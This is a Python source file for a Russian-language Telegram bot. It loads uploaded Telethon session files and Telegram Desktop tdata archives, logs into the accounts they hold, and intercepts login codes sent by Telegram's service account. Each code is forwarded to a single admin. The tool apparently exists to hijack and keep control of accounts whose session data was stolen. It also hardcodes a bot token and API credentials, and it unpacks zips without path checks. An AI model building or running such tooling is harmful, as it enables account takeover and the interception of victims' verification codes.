import asyncio
import os
import logging
import zipfile
import shutil
from pathlib import Path
from telethon import TelegramClient, events
import re

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "8093840114:AAFsQYymLv0rP25l1d2EcRyi4XxvysepCBA"
ADMIN_ID = 8998830409
API_ID = 37658735
API_HASH = "728f6de622061878b84d9f843181d879"
SESSIONS_DIR = "./sessions"
TDATA_DIR = "./tdata_accounts"

accounts = {}
pending_codes = {}

os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(TDATA_DIR, exist_ok=True)


async def setup_code_listener(client: TelegramClient, phone: str):
    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        msg = event.message.message or ""
        sender = await event.get_sender()
        sender_id = getattr(sender, 'id', 0)

        if sender_id == 777000:
            code_match = re.search(r'\b(\d{5,6})\b', msg)
            if code_match:
                code = code_match.group(1)
                pending_codes[phone] = code
                logger.info(f"📨 Код для {phone}: {code}")
                bot = Bot(token=BOT_TOKEN)
                keyboard = [[InlineKeyboardButton("✅ Использован", callback_data=f"clear_code_{phone}")]]
                await bot.send_message(
                    ADMIN_ID,
                    f"🔐 *Новый код для* `{phone}`\n\nКод: `{code}`\n\n📩 _{msg}_",
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )


async def load_account_from_session(session_path: str) -> bool:
    phone = Path(session_path).stem
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        if await client.is_user_authorized():
            accounts[phone] = {"client": client, "session_file": session_path}
            await setup_code_listener(client, phone)
            logger.info(f"✅ Загружен: {phone}")
            return True
        else:
            await client.disconnect()
            return False
    except Exception as e:
        logger.error(f"Ошибка {phone}: {e}")
        return False


async def convert_tdata_to_session(tdata_path: str, phone: str):
    try:
        from opentele.td import TDesktop
        from opentele.api import UseCurrentSession
        tdesk = TDesktop(tdata_path)
        if not tdesk.isLoaded():
            return None
        session_path = os.path.join(SESSIONS_DIR, f"{phone}.session")
        client = await tdesk.ToTelethon(session=session_path, flag=UseCurrentSession, api=None)
        await client.connect()
        if await client.is_user_authorized():
            await client.disconnect()
            return session_path
        await client.disconnect()
        return None
    except Exception as e:
        logger.error(f"Ошибка конвертации: {e}")
        return None


async def load_sessions():
    for session_file in Path(SESSIONS_DIR).glob("*.session"):
        await load_account_from_session(str(session_file))


# ===== ХЕНДЛЕРЫ =====
def is_admin(user_id): return user_id == ADMIN_ID


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("📱 Все аккаунты", callback_data="my_accounts")],
            [InlineKeyboardButton("⚙️ Админка", callback_data="admin_panel")],
        ]
        text = "👑 *Добро пожаловать, Админ!*\n\nВыберите действие:"
    else:
        keyboard = [[InlineKeyboardButton("📱 Аккаунты", callback_data="my_accounts")]]
        text = "👋 *Добро пожаловать!*\n\nВыберите действие:"
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    data = query.data

    if data == "my_accounts":
        if not accounts:
            kb = [[InlineKeyboardButton("🔙 Назад", callback_data="back_main")]]
            await query.edit_message_text("📭 *Нет аккаунтов*", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
            return
        kb = []
        for phone in accounts:
            label = f"🔴 {phone}" if phone in pending_codes else f"📱 {phone}"
            kb.append([InlineKeyboardButton(label, callback_data=f"account_{phone}")])
        kb.append([InlineKeyboardButton("🔙 Назад", callback_data="back_main")])
        await query.edit_message_text(f"📱 *Аккаунты* ({len(accounts)}):", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("account_"):
        phone = data.replace("account_", "")
        code_info = f"\n\n🔐 Последний код: `{pending_codes[phone]}`" if phone in pending_codes else ""
        kb = [
            [InlineKeyboardButton("📨 Получить код", callback_data=f"get_code_{phone}")],
            [InlineKeyboardButton("🔙 Назад", callback_data="my_accounts")]
        ]
        await query.edit_message_text(f"📱 *Аккаунт:* `{phone}`{code_info}", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("get_code_"):
        phone = data.replace("get_code_", "")
        kb = [[InlineKeyboardButton("🔙 Назад", callback_data=f"account_{phone}")]]
        if phone in pending_codes:
            await query.edit_message_text(f"🔐 *Код для* `{phone}`\n\n`{pending_codes[phone]}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
        else:
            await query.edit_message_text(f"⏳ *Кодов нет* для `{phone}`\n\nКод придёт автоматически.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("clear_code_"):
        phone = data.replace("clear_code_", "")
        pending_codes.pop(phone, None)
        await query.edit_message_text(f"✅ Код для `{phone}` отмечен использованным.", parse_mode='Markdown')

    elif data == "admin_panel":
        if not is_admin(user_id): return
        kb = [
            [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Назад", callback_data="back_main")]
        ]
        await query.edit_message_text("⚙️ *Админка*", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

    elif data == "admin_stats":
        if not is_admin(user_id): return
        codes_list = "\n".join([f"• `{p}`: `{c}`" for p, c in pending_codes.items()]) or "Нет кодов"
        kb = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
        await query.edit_message_text(
            f"📊 *Статистика*\n\n📱 Аккаунтов: `{len(accounts)}`\n🔐 Активных кодов: `{len(pending_codes)}`\n\n*Коды:*\n{codes_list}",
            parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb)
        )

    elif data == "back_main":
        if is_admin(user_id):
            kb = [
                [InlineKeyboardButton("📱 Все аккаунты", callback_data="my_accounts")],
                [InlineKeyboardButton("⚙️ Админка", callback_data="admin_panel")],
            ]
            text = "👑 *Добро пожаловать, Админ!*\n\nВыберите действие:"
        else:
            kb = [[InlineKeyboardButton("📱 Аккаунты", callback_data="my_accounts")]]
            text = "👋 *Добро пожаловать!*\n\nВыберите действие:"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))


async def handle_uploaded_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    doc = update.message.document
    if not doc:
        return
    filename = doc.file_name or ""

    if filename.endswith('.session'):
        file = await doc.get_file()
        session_path = os.path.join(SESSIONS_DIR, filename)
        await file.download_to_drive(session_path)
        phone = Path(filename).stem
        msg = await update.message.reply_text(f"⏳ Загружаю `{phone}`...", parse_mode='Markdown')
        success = await load_account_from_session(session_path)
        if success:
            await msg.edit_text(f"✅ Аккаунт `{phone}` добавлен!", parse_mode='Markdown')
        else:
            await msg.edit_text(f"❌ Сессия `{phone}` не авторизована.", parse_mode='Markdown')

    elif filename.endswith('.zip'):
        file = await doc.get_file()
        zip_path = f"/tmp/{filename}"
        await file.download_to_drive(zip_path)
        msg = await update.message.reply_text("⏳ Распаковываю архив...", parse_mode='Markdown')

        name_parts = filename.replace('.zip', '').split('_')
        phone = name_parts[1] if len(name_parts) >= 2 else filename.replace('.zip', '')

        extract_dir = f"/tmp/extracted_{phone}"
        os.makedirs(extract_dir, exist_ok=True)

        with zipfile.ZipFile(zip_path, 'r') as z:
            z.extractall(extract_dir)
            files_inside = z.namelist()

        has_session = any(f.endswith('.session') for f in files_inside)
        has_tdata = any('tdata/' in f for f in files_inside)

        if has_session:
            await msg.edit_text("📦 Найден session файл, загружаю...", parse_mode='Markdown')
            for f in files_inside:
                if f.endswith('.session'):
                    src = os.path.join(extract_dir, f)
                    dst = os.path.join(SESSIONS_DIR, os.path.basename(f))
                    shutil.copy2(src, dst)
                    p = Path(f).stem
                    success = await load_account_from_session(dst)
                    if success:
                        await msg.edit_text(f"✅ Аккаунт `{p}` добавлен!", parse_mode='Markdown')
                    else:
                        await msg.edit_text(f"❌ Сессия `{p}` не авторизована.", parse_mode='Markdown')

        elif has_tdata:
            await msg.edit_text("📦 Найден tdata, конвертирую...", parse_mode='Markdown')
            tdata_path = os.path.join(extract_dir, 'tdata')
            if not os.path.exists(tdata_path):
                for root, dirs, _ in os.walk(extract_dir):
                    if 'tdata' in dirs:
                        tdata_path = os.path.join(root, 'tdata')
                        break
            session_path = await convert_tdata_to_session(tdata_path, phone)
            if session_path:
                success = await load_account_from_session(session_path)
                if success:
                    await msg.edit_text(f"✅ Аккаунт `{phone}` конвертирован и добавлен!", parse_mode='Markdown')
                else:
                    await msg.edit_text(f"❌ Не удалось авторизоваться `{phone}`.", parse_mode='Markdown')
            else:
                await msg.edit_text("❌ Не удалось конвертировать tdata.\n\n`pip install opentele`", parse_mode='Markdown')
        else:
            await msg.edit_text("❌ В архиве нет ни .session ни tdata/", parse_mode='Markdown')

        shutil.rmtree(extract_dir, ignore_errors=True)
        os.remove(zip_path)


# ===== ЗАПУСК (исправлен для Railway/сервера) =====
async def main():
    # Сначала грузим сессии
    await load_sessions()

    # Строим приложение
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_uploaded_file))

    # Инициализируем и запускаем вручную (без run_polling чтобы не конфликтовал с asyncio)
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)

    logger.info("🤖 Бот запущен!")

    # Держим процесс живым
    try:
        await asyncio.Event().wait()
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()


if __name__ == "__main__":
    asyncio.run(main())
